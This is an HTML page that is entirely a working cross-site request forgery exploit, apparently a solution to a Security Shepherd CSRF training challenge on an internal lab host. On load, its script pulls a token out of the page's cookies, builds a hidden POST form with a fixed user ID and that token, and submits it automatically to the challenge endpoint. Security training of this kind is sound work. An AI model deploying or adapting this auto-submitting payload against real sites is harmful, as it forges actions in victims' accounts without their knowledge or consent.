<!doctype HTML>
<html>
    <head>
        <title>Crazydais - CSRF</title>
    </head>

    <body>
        <h1>Crazydais - CSRF</h1>
        <div id="mycsrf"></div>
        <script>
            (function () {
                
                var csrf = 'a1b2';
                try {
                    csrf = getTokenFromCookie();
                }
                catch(e) {
                    console.log('xss is not working, what to do now!?');
                }
                var form = createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
                var div = document.getElementById("mycsrf");
                div.appendChild(form);
                
                var csrfForm = document.getElementById("csrf-form");
                csrfForm.submit();
            })();
            
            function getTokenFromCookie() {
                var csrfCookie = document.cookie.split(';')[0];
                var csrfToken = csrfCookie.split('=')[1];
                console.log('getTokenFromCookie - The token is: ' + csrfToken);
                return csrfToken;
            }
            
            function addInputToForm(form, name, value) {
                // Create a hidden input element, and append it to the form
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }
            
            function createForm(id, csrf) {
                var form = document.createElement('form');
                form.id = "csrf-form";
                form.action = 'https://shepherd.waratek.lan/user/csrfchallengethree/plusplus';
                form.method = 'POST';
                addInputToForm(form, 'userId', id);
                addInputToForm(form, 'csrfToken', csrf);
                //form.submit();
                return form;
            }
        </script>
    </body>
</html>
